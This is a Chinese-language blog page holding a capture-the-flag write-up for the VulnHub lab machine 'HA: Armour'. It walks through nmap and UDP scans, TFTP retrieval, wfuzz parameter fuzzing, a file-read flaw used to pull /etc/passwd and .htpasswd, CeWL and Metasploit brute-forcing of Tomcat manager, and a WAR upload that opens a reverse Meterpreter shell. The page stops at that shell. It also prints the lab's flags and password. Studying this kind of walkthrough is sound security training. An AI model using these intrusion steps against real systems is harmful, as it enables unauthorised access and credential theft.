<!DOCTYPE html>
<html lang=zh>
<head><meta name="generator" content="Hexo 3.8.0">
    <!-- so meta -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-8217582216393706",
    enable_page_level_ads: true
  });
</script>
<!-- <br> -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="下载地址：点我 bilibili：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10">
<meta name="keywords" content="CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="HA: Armour-Write-up">
<meta property="og:url" content="https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/index.html">
<meta property="og:site_name" content="Kali-Team">
<meta property="og:description" content="下载地址：点我 bilibili：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-10-10T10:22:03.824Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="HA: Armour-Write-up">
<meta name="twitter:description" content="下载地址：点我 bilibili：点我 信息收集 nmap扫存活找到IP为：192.168.116.140  123456789101112131415161718192021222324252627282930313233➜  ~ nmap -sn 192.168.116.1/24      Starting Nmap 7.80 ( https://nmap.org ) at 2019-10">
    
    
        
          
              <link rel="shortcut icon" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=16">
          
        
        
          
            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=192" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/bc985422e4fd51abac5af2691ee33a93?s=180">
          
        
    
    <!-- title -->
    <title>HA: Armour-Write-up</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="https://www.yuque.com/kali-team">项目</a></li>
         
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2019/09/25/ha-wordy-Write-up/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&text=HA: Armour-Write-up"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&is_video=false&description=HA: Armour-Write-up"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HA: Armour-Write-up&body=Check out this article: https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&title=HA: Armour-Write-up"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.kali-team.cn/2019/10/09/HA-Armour-Write-up/&name=HA: Armour-Write-up&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat-获取会话"><span class="toc-number">2.</span> <span class="toc-text">tomcat 获取会话</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-number">3.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提Root权限"><span class="toc-number">4.</span> <span class="toc-text">提Root权限</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HA: Armour-Write-up
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Kali-Team</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-10-09T13:20:23.462Z" itemprop="datePublished">2019-10-09</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/CTF/">CTF</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <hr>
<hr>
<p>下载地址：<a href="https://www.vulnhub.com/entry/ha-armour,370/" target="_blank" rel="noopener">点我</a></p>
<p>bilibili：<a href="https://www.bilibili.com/video/av70769082" target="_blank" rel="noopener">点我</a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul>
<li>nmap扫存活找到IP为：192.168.116.140</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">➜  ~ nmap -sn 192.168.116.1/24      </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-09 21:21 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.1</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.140</span><br><span class="line">Host is up (0.00074s latency).</span><br><span class="line">Nmap <span class="keyword">done</span>: 256 IP addresses (2 hosts up) scanned <span class="keyword">in</span> 5.09 seconds</span><br><span class="line">➜  ~ nmap -A -T4 192.168.116.140 -p-</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-09 21:23 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.140</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: HA: Armour</span><br><span class="line">8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">| ajp-methods: </span><br><span class="line">|_  Supported methods: GET HEAD POST OPTIONS</span><br><span class="line">8080/tcp  open  http    Apache Tomcat 9.0.24</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat/9.0.24</span><br><span class="line">65534/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 28:eb:55:eb:a6:63:c6:fd:23:36:31:27:de:cb:f8:0d (RSA)</span><br><span class="line">|   256 a5:1b:86:a9:66:3e:b6:e6:af:d4:33:fe:2c:84:3b:62 (ECDSA)</span><br><span class="line">|_  256 c7:b2:0c:45:7f:9c:a2:98:fb:52:75:0d:0d:e1:1f:24 (ED25519)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 10.68 seconds</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li><p>开放80,8009,8080端口，都是Web服务分别是Apache httpd，Apache Jserv和Apache Tomcat，还有一个65534端口为ssh服务。</p>
</li>
<li><p>指定端口连接ssh，得到第一个flag：<code>HulkBuster Armour:{7BDA7019C06B53AEFC8EE95D2CDACCAA}</code>，和提示：TheOlympics</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ ssh 192.168.116.140 -p65534      </span><br><span class="line">The authenticity of host <span class="string">'[192.168.116.140]:65534 ([192.168.116.140]:65534)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:kYh7ax5tplAJb0W9IkeVePlscYpVFgSLsyepRlFi20A.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added '</span>[192.168.116.140]:65534<span class="string">' (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                             </span></span><br><span class="line"><span class="string">       db         88888888ba   88b           d88    ,ad8888ba,    88        88  88888888ba   </span></span><br><span class="line"><span class="string">      d88b        88      "8b  888b         d888   d8"'</span>    `<span class="string">"8b   88        88  88      "</span>8b  </span><br><span class="line">     d8<span class="string">'`8b       88      ,8P  88`8b       d8'</span>88  d8<span class="string">'        `8b  88        88  88      ,8P  </span></span><br><span class="line"><span class="string">    d8'</span>  `8b      88aaaaaa8P<span class="string">'  88 `8b     d8'</span> 88  88          88  88        88  88aaaaaa8P<span class="string">'  </span></span><br><span class="line"><span class="string">   d8YaaaaY8b     88""""88'</span>    88  `8b   d8<span class="string">'  88  88          88  88        88  88""""88'</span>    </span><br><span class="line">  d8<span class="string">""</span><span class="string">""</span><span class="string">""</span><span class="string">""</span>8b    88    `8b    88   `8b d8<span class="string">'   88  Y8,        ,8P  88        88  88    `8b    </span></span><br><span class="line"><span class="string"> d8'</span>        `8b   88     `8b   88    `888<span class="string">'    88   Y8a.    .a8P   Y8a.    .a8P  88     `8b   </span></span><br><span class="line"><span class="string">d8'</span>          `8b  88      `8b  88     `8<span class="string">'     88    `"Y8888Y"'</span>     `<span class="string">"Y8888Y"</span><span class="string">'   88      `8b  </span></span><br><span class="line"><span class="string">                                                                                             </span></span><br><span class="line"><span class="string">                                                                                             </span></span><br><span class="line"><span class="string">                                www.hackingarticles.in</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                 HulkBuster Armour:&#123;7BDA7019C06B53AEFC8EE95D2CDACCAA&#125;</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">                              Hint 1: TheOlympics</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">kali-team@192.168.116.140'</span>s password:</span><br></pre></td></tr></table></figure>
<ul>
<li>浏览器访问80端口，F12发现注释里有armour，notes.txt，还有69，开始不知道什么意思。但是对TCP/UDP端口列表熟悉的话，可以猜出来是TFTP(小型文件传输协议)的端口，<a href="https://zh.wikipedia.org/wiki/TCP/UDP%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8" target="_blank" rel="noopener">详细TCP/UDP端口列表</a>。</li>
<li>可以使用nmap加UDP协议判断69端口是否开放。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo  nmap -sU -p69 192.168.116.140</span><br><span class="line">[sudo] kali-team 的密码：</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-09 21:38 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.116.140</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE         SERVICE</span><br><span class="line">69/udp open|filtered tftp</span><br><span class="line">MAC Address: 00:0C:29:E7:98:9F (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.92 seconds</span><br></pre></td></tr></table></figure>
<ul>
<li>因为要发送UDP报文，所以要加sudo以Root权限执行。发现目标有开放69端口。</li>
<li>TFTP客户端连上服务端下载notes.txt文件，得到第二个flag。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ atftp                </span><br><span class="line">tftp&gt; connect 192.168.116.140</span><br><span class="line">tftp&gt; get notes.txt</span><br><span class="line">tftp&gt; quit </span><br><span class="line">➜  ~ cat notes.txt</span><br><span class="line">Spiderman Armour:&#123;83A75F0B31435193BAFD3B9C5FD45AEC&#125;</span><br><span class="line"></span><br><span class="line">Hint 2: maybeevena</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>还有一个提示<code>maybeevena</code>，不知道什么鬼。先爆破80端口的php后缀文件。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ dirb http://192.168.116.140 -X .php</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Wed Oct  9 22:23:10 2019</span><br><span class="line">URL_BASE: http://192.168.116.140/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.116.140/ ----</span><br><span class="line">+ http://192.168.116.140/file.php (CODE:200|SIZE:0)                                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                                              </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Wed Oct  9 22:23:13 2019</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 1</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>找到file.php，打开页面一片空白，fuzz参数。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ wfuzz -w Kali-Team_Tools/fuzzdb/attack/business-logic/CommonMethodNames.txt --hw 0 <span class="string">'http://192.168.116.140/file.php?FUZZ=/etc/passwd'</span> </span><br><span class="line">libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /home/kali-team/.<span class="built_in">local</span>/lib/python3.7/site-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named <span class="string">'shodan'</span></span><br><span class="line">libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /home/kali-team/.<span class="built_in">local</span>/lib/python3.7/site-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named <span class="string">'shodan'</span></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4 - The Web Fuzzer                           *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.116.140/file.php?FUZZ=/etc/passwd</span><br><span class="line">Total requests: 77</span><br><span class="line"></span><br><span class="line">===================================================================</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                       </span><br><span class="line">===================================================================</span><br><span class="line"></span><br><span class="line">000000033:   200        28 L     36 W     1437 Ch     <span class="string">"file"</span>                                                                                                                                                                        </span><br><span class="line"></span><br><span class="line">Total time: 0.130840</span><br><span class="line">Processed Requests: 77</span><br><span class="line">Filtered Requests: 76</span><br><span class="line">Requests/sec.: 588.5036</span><br><span class="line"></span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>找到参数为file，还是一个文件读取漏洞，因为是Apache的服务，所以先想到读取Apache相关的文件，敏感的文件有<code>.htpasswd</code>，一般在<code>/etc/apache2/.htpasswd</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ curl http://192.168.116.140/file.php\?file\=/etc/apache2/.htpasswd                      </span><br><span class="line">Ant-Man Armour:&#123;A9F56B7ECE2113C9C4A1214A19EDE99C&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hint 3: StarBucks</span><br><span class="line">➜  ~</span><br></pre></td></tr></table></figure>
<ul>
<li>找到第三个flag，和第三个提示：StarBucks。</li>
<li>官方提示：</li>
</ul>
<blockquote>
<p>P.S. Klaw has a habit of dividing his passwords into 3 parts and save them at different locations. So, if you get some combine them to move forward.</p>
</blockquote>
<ul>
<li>三个提示拼起来就是：TheOlympics maybeevena starBucks，强行当密码。</li>
</ul>
<h2 id="tomcat-获取会话"><a href="#tomcat-获取会话" class="headerlink" title="tomcat 获取会话"></a>tomcat 获取会话</h2><ul>
<li>浏览器打开8080端口，发现是一个Tomcat的管理页面，密码已经知道，现在来爆破用户名。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">➜  CeWL git:(master) ✗ ./cewl.rb -v  http://192.168.116.140 -d 10 -w dict.txt </span><br><span class="line">CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">Starting at http://192.168.116.140</span><br><span class="line">Visiting: http://192.168.116.140, got response code 200</span><br><span class="line">Attribute text found:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Offsite link, not following: https://hackingarticles.in</span><br><span class="line">Writing words to file</span><br><span class="line">➜  CeWL git:(master) ✗ cat dict.txt           </span><br><span class="line">Armour</span><br><span class="line">PAGE</span><br><span class="line">CONTENT</span><br><span class="line">Header</span><br><span class="line">ARMOUR</span><br><span class="line">Collection</span><br><span class="line">Armours</span><br><span class="line">MCU</span><br><span class="line">Photo</span><br><span class="line">Grid</span><br><span class="line">armour</span><br><span class="line">End</span><br><span class="line">Page</span><br><span class="line">Content</span><br><span class="line">Footer</span><br><span class="line">Powered</span><br><span class="line">Hacking</span><br><span class="line">Articles</span><br><span class="line">notes</span><br><span class="line">txt</span><br><span class="line">➜  CeWL git:(master) ✗ <span class="built_in">pwd</span>               </span><br><span class="line">/home/kali-team/Kali-Team_Tools/CeWL</span><br><span class="line">➜  CeWL git:(master) ✗</span><br></pre></td></tr></table></figure>
<ul>
<li>使用CeWL爬80端口的网页生成用户名的字典，使用MSF对Tomcat进行登录密码枚举。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(scanner/http/tomcat_mgr_login) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/http/tomcat_mgr_login):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting                                                 Required  Description</span><br><span class="line">   ----              ---------------                                                 --------  -----------</span><br><span class="line">   BLANK_PASSWORDS   <span class="literal">true</span>                                                            no        Try blank passwords <span class="keyword">for</span> all users</span><br><span class="line">   BRUTEFORCE_SPEED  5                                                               yes       How fast to bruteforce, from 0 to 5</span><br><span class="line">   DB_ALL_CREDS      <span class="literal">false</span>                                                           no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">   DB_ALL_PASS       <span class="literal">false</span>                                                           no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">   DB_ALL_USERS      <span class="literal">false</span>                                                           no        Add all users <span class="keyword">in</span> the current database to the list</span><br><span class="line">   PASSWORD          TheOlympicsmaybeevenaStarBucks                                  no        The HTTP password to specify <span class="keyword">for</span> authentication</span><br><span class="line">   PASS_FILE         /opt/metasploit/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line</span><br><span class="line">   Proxies                                                                           no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS            192.168.116.140                                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class="string">'file:&lt;path&gt;'</span></span><br><span class="line">   RPORT             8080                                                            yes       The target port (TCP)</span><br><span class="line">   SSL               <span class="literal">false</span>                                                           no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   STOP_ON_SUCCESS   <span class="literal">false</span>                                                           yes       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">   TARGETURI         /manager/html                                                   yes       URI <span class="keyword">for</span> Manager login. Default is /manager/html</span><br><span class="line">   THREADS           1                                                               yes       The number of concurrent threads</span><br><span class="line">   USERNAME                                                                          no        The HTTP username to specify <span class="keyword">for</span> authentication</span><br><span class="line">   USERPASS_FILE     /opt/metasploit/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line</span><br><span class="line">   USER_AS_PASS      <span class="literal">false</span>                                                           no        Try the username as the password <span class="keyword">for</span> all users</span><br><span class="line">   USER_FILE         /home/kali-team/Kali-Team_Tools/CeWL/dict.txt                   no        File containing users, one per line</span><br><span class="line">   VERBOSE           <span class="literal">true</span>                                                            yes       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line">   VHOST                                                                             no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/tomcat_mgr_login) &gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>不知道为什么，我重启服务器后才枚举出来，用户名是：armour。</li>
<li><code>[+] 192.168.116.140:8080 - Login Successful: armour:TheOlympicsmaybeevenaStarBucks</code></li>
<li>Tomcat上传木马有很多方法，可以手工上传WAR文件部署。</li>
<li>这里就使用MSF比较省时间。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/tomcat_mgr_upload) &gt; <span class="built_in">set</span> httppassword                                                                                                                                                                                  </span><br><span class="line"><span class="built_in">set</span> httppassword  </span><br><span class="line">msf5 exploit(multi/http/tomcat_mgr_upload) &gt; <span class="built_in">set</span> httppassword TheOlympicsmaybeevenaStarBucks</span><br><span class="line">httppassword =&gt; TheOlympicsmaybeevenaStarBucks</span><br><span class="line">msf5 exploit(multi/http/tomcat_mgr_upload) &gt; <span class="built_in">set</span> httpusername armour</span><br><span class="line">httpusername =&gt; armour</span><br><span class="line">msf5 exploit(multi/http/tomcat_mgr_upload) &gt; run </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.116.1:4444 </span><br><span class="line">[*] Retrieving session ID and CSRF token...</span><br><span class="line">[*] Uploading and deploying wJ0oIWvcGX...</span><br><span class="line">[*] Executing wJ0oIWvcGX...</span><br><span class="line">[*] Undeploying wJ0oIWvcGX ...</span><br><span class="line">[*] Sending stage (53867 bytes) to 192.168.116.140</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.116.1:4444 -&gt; 192.168.116.140:50706) at 2019-10-09 23:47:49 